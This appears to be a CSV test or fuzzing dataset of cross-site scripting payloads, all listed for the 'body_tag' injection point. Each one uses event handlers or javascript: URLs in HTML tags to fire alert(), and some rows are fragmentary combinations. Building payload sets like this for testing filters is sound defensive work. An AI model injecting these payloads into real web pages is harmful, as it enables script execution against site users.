eval_place,injection_code
body_tag,"<div onmouseover='alert(""XSS"")'><iframe src='javascript:alert(`XSS`)'><svg onload='alert(1)'>"
body_tag,"<div onmouseover='alert(""XSS"")'><input type='text' value='' onfocus='alert(""XSS"")' autofocus></a>"
body_tag,"<div onmouseover='alert(""XSS"")'><a href='javascript:alert(`XSS`)'><input type='text' value='' onfocus='alert(""XSS"")' autofocus>"
body_tag,</a><a href='javascript:alert(`XSS`)'></a>
body_tag,"<input type='text' value='' onfocus='alert(""XSS"")' autofocus><input type='text' value='' onfocus='alert(""XSS"")' autofocus><a href='javascript:alert(`XSS`)'>"
body_tag,"javascript:alert(</div><iframe src=""javascript:alert('XSS')"">"
body_tag,"<img src=""x"" onerror=""alert('XSS')"">javascript:alert(action='"""
body_tag,"<img src=""x"" onerror=""alert('XSS')""><img src='x' onerror='alert(1)'/>javascript:alert("
body_tag,"<body onload=""alert('XSS')""><video>action='"""
body_tag,"<iframe src=""javascript:alert('XSS')""></div><img src='x' onerror='alert(1)'/>"
body_tag,"<iframe src=""javascript:alert('XSS')""><source onerror='javascript:alert(""XSS"")'><iframe src=""javascript:alert('XSS')"">"
body_tag,"<body onload=""alert('XSS')""><iframe src=""javascript:alert('XSS')""><video>"
body_tag,"<a href='javascript:alert(""XSS5"");'><svg onload=alert('XSS3')><img src=x onerror=alert('XSS2')>"
body_tag,"<div onmouseover='alert(""XSS7"")'><div onmouseover='alert(""XSS7"")'><svg onload=alert('XSS3')>"
body_tag,"<input type='text' value='' onchange='alert(""XSS4"")'></form><svg onload=alert('XSS3')>"
body_tag,"<div onmouseover='alert(""XSS7"")'><body onload=alert('XSS4')><a href='javascript:alert(""XSS5"");'>"
body_tag,"<a href='javascript:alert(""XSS5"");'><img src=x onerror=alert('XSS2')><img src=x onerror=alert('XSS2')>"
body_tag,"<svg onload=alert('XSS3')><img src=x onerror=alert('XSS2')><a href='javascript:alert(""XSS5"");'>"
body_tag,"</math><a href=""javascript:alert('XSS7');""><svg onload=alert('XSS3')>"
